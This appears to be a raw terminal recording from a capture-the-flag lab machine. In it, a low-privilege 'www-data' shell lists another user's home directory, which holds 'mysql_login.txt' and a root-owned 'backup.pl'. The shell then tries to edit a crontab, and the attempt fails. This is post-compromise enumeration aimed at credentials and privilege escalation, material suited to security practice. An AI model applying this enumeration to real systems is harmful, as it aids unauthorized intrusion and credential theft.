+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
+-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
+-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ crobt[K[Kntab -e[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcrontab -e
+[Kcrontab -e
+[Kno crontab for www-data - using an empty one
+touch: cannot touch '/.selected_editor': Permission denied
+[KUnable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+[K[K[?2004h[?2004l[?2004h
+[K
+[KError opening terminal: unknown.
+crontab: "/usr/bin/sensible-editor" exited with status 1
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ crontab[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcrontab
+[Kcrontab
+[K[K[?2004h[?2004l[?2004h
+[K
+[K
+[?2004l
+Script done on 2025-03-31 03:24:20+03:00 [COMMAND_EXIT_CODE="1"]
